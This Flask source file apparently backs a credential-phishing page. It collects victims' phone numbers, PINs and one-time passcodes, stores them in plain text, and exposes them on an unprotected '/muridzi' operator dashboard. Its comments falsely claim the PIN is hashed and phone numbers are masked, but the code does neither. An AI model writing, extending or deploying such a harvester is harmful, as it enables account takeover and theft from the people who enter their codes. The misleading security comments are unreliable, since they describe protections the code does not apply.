from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import hashlib
from datetime import datetime

app = Flask(__name__)

DB = "database.db"

# --------------------------
# Initialize database
# --------------------------
def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS verifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            pin TEXT,
            otp TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()


# --------------------------
# ROUTES
# --------------------------

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/verify", methods=["GET", "POST"])
def verify():
    if request.method == "POST":
        phone = request.form.get("phone")
        pin_digits = request.form.getlist("pin[]")
        pin_raw = "".join(pin_digits)

        # HASH pin (never store raw)
        pin_hash = pin_raw

        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute(
            "INSERT INTO verifications (phone, pin, created_at) VALUES (?, ?, ?)",
            (phone, pin_hash, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()

        return redirect(url_for("otp_page", phone=phone))

    return render_template("verify.html")


@app.route("/otp", methods=["GET", "POST"])
def otp_page():
    phone = request.args.get("phone") or request.form.get("phone")

    if request.method == "POST":
        otp = request.form.get("otp")

        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute(
            "UPDATE verifications SET otp=? WHERE phone=?",
            (otp, phone)
        )
        conn.commit()
        conn.close()

        # Demo response only
        return render_template("verifying.html")

    return render_template("otp.html", phone=phone)


# --------------------------
# MURIDZI DASHBOARD (READ-ONLY)
# --------------------------
@app.route("/muridzi")
def muridzi():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, pin, otp, created_at FROM verifications ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()

    # Mask phone numbers for safety
    masked = []
    for r in rows:
        phone = r[0]
        masked_phone = phone
        masked.append({
            "phone": masked_phone,
            "pin": r[1][:10] + "...",
            "otp": r[2] if r[2] else "—",
            "time": r[3]
        })

    return render_template("muridzi.html", submissions=masked)





# --------------------------
# MAIN
# --------------------------
if __name__ == "__main__":
    app.run()
